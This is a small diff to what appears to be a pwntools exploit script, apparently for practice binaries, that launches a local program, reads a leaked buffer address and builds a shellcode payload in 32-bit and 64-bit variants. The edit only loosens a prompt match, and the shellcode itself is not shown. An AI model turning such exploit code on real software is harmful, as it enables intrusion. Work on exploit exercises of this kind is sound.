@@ -11,7 +11,7 @@ def bit32_exploit(binary_name):
         context.log_level = 'debug'
         print("roop " , i )
         p = process('./'+binary_name)
-        p.recvuntil('buf : ')
+        p.recvuntil(': ')
         addr = int(p.recv(10),16)
 
         payload = shellcode_32bit
@@ -40,7 +40,7 @@ def bit64_exploit(binary_name):
         context.log_level = 'debug'
         print("roop " , i )
         p = process('./'+binary_name)
-        p.recvuntil('buf : ')
+        p.recvuntil(': ')
         addr = int(p.recv(14),16)
 
         payload = shellcode_64bit
